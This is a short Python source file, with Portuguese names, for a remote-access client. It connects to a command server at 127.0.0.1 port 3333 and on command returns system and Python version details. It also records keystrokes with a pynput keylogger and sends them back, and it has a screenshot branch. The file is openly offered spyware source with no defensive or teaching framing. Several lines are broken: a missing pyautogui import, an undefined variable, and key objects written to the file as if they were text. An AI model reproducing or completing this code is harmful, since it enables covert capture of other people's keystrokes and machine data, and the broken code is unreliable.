import socket,platform,os
from pynput.keyboard import Key, Listener

def on_press(key):
    arquivo = open('key.txt','a')
    arquivo.write(key)
    arquivo.close()
    arquivo = open('key.txt','r')
    quantidade = len(arquivo.readlines())
    if(quantidade >= 10):
        return False

# Keylogger Function


def enviar_mensagem(mensagem,cliente):
    cliente.send(mensagem.encode())

cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Ip = "127.0.0.1"
Porta = 3333
cliente.connect((Ip,Porta))

while True:
    mensagem = cliente.recv(2048)
    mensagem_decode = mensagem.decode()
    print(mensagem_decode)

    if(mensagem_decode.upper() == "DETALHES DA MAQUINA"):
        mensagem = "\nSistema: {}\nNó: {}\nRelease: {}\nVersão: {}\nBits do processador: {}".format(platform.system(),
        platform.node(),platform.release(),platform.version(),platform.processor())

    elif(mensagem_decode.upper() == "DETALHES DO PYTHON"):
        mensagem = "\nVersao: {}\n Versao Tuple: {} \nCompilador: {} Build: {}".format(platform.python_version(),
        platform.python_version_tuple(),
        platform.python_compiler(),
        platform.python_build())

    elif(mensagem_decode.upper() == "KEYLOGGER"):
        arquivo = open('key.txt','w')
        arquivo.close()
        with Listener(on_press = on_press) as listener:
            listener.start()
        arquivo = open('key.txt','r')
        mensagem = arquivo.readlines()
        arquivo.close()
        os.remove('key.txt')

    elif(mensagem_decode.upper() == "SCREENSHOT"):
        fig = pyautogui.screenshot(r)
        fig.save(r'fig.png')

    else:
        mensagem = "\nComando nao reconhecido no sistema, tente novamente"

    enviar_mensagem(mensagem,cliente)
